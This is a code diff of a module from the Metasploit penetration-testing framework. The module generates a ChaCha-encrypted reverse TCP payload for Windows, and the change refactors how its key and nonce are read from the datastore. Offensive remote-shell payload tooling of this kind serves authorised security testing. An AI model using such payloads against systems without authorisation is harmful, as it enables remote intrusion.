@@ -10,7 +10,7 @@ module Msf
 
 ###
 #
-# encrypted reverse tcp payload for Windows x86
+# encrypted reverse tcp payload for Windows
 #
 ###
 module Payload::Windows::EncryptedReverseTcp
@@ -55,16 +55,16 @@ module Payload::Windows::EncryptedReverseTcp
     get_compiled_shellcode(src, compile_opts)
   end
 
-  def initial_code(conf)
+  def initial_code
     src = headers
     src << '  #include "64BitHelper.h"' if self.arch_to_s.eql?(ARCH_X64)
-    src << chacha_key(conf)
+    src << chacha_key
     src << chacha_func
     src << exit_proc
   end
 
   def generate_stager(conf)
-    src = initial_code(conf)
+    src = initial_code
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -77,9 +77,11 @@ module Payload::Windows::EncryptedReverseTcp
     src << stager_comm
   end
 
-  def generate_stage(opts={})
-    key = opts[:key]
-    nonce = opts[:iv]
+  def generate_stage(opts)
+    conf = opts[:datastore]
+    key = conf['ChachaKey']
+    nonce = conf['ChachaNonce']
+    iv = "\x01\x00\x00\x00" + nonce
 
     comp_opts =
     {
@@ -90,7 +92,7 @@ module Payload::Windows::EncryptedReverseTcp
       arch:          self.arch_to_s
     }
 
-    src = initial_code(opts)
+    src = initial_code
     src << init_proc
     src << exec_payload_stage
     shellcode = get_compiled_shellcode(src, comp_opts)
@@ -99,7 +101,7 @@ module Payload::Windows::EncryptedReverseTcp
   end
 
   def generate_c_src(conf)
-    src = initial_code(conf)
+    src = initial_code
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -160,10 +162,10 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def chacha_key(conf)
+  def chacha_key
     %Q^
-      #define KEY     "#{conf[:key]}"
-      #define NONCE   "#{conf[:nonce]}"
+      #define KEY     "#{datastore['ChachaKey']}"
+      #define NONCE   "#{datastore['ChachaNonce']}"
     ^
   end
 
